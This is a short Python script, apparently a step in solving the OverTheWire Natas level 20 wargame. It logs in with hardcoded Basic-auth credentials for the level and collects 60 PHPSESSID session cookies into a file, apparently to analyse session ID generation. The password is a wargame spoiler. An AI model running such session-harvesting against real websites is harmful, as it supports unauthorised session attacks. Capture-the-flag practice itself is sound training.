import requests
from requests.auth import HTTPBasicAuth
import string

auth = HTTPBasicAuth('natas20','guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH')

with open('natas20SID.txt', 'w') as file:
    for i in range(60):
        r = requests.get('http://natas20.natas.labs.overthewire.org/index.php', auth=auth)
        sid = r.cookies.get("PHPSESSID")
        file.write(sid + "\n")